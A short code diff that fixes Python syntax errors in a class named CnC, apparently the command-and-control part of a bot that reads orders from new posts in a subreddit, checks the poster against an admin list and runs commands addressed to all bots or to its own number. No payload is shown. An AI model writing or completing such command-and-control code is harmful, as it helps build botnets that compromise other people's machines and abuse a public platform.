@@ -5,7 +5,7 @@ import git
 
 class CnC:
 
-	def __init__(reddit):
+	def __init__(self, reddit):
 
 		self.reddit = reddit
 
@@ -18,10 +18,10 @@ class CnC:
 
 		return
 
-	def __del__():
+	def __del__(self):
 		return
 
-	parseCommands(self, commands):
+	def parseCommands(self, commands):
 		commands = commands.splitlines()
 		for command in commands:
 			if str.lower("all") in command or self.botnum in command:
@@ -39,7 +39,7 @@ class CnC:
 
 		return False
 
-	cnc():
+	def cnc(self):
 		try:
 			for submission in reddit.subreddit(c2).new(limit=1):
 				if submission.author in self.admins and submission.id not in open('cncLog.txt', 'r').read():
